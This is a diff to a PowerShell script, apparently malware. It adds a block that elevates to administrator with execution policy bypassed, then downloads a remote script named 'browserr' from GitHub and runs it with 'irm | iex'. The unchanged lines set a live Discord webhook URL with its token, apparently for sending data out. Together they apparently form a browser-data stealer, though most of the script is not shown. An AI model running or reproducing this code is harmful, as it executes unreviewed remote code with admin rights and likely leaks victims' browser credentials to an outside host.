@@ -1,3 +1,9 @@
+# Self-elevation to admin
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-EP Bypass -Command irm https://raw.githubusercontent.com/nigmaBoy/pico/refs/heads/main/browserr|iex"
+    exit
+}
+
 # Discord Webhook
 $webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"
 
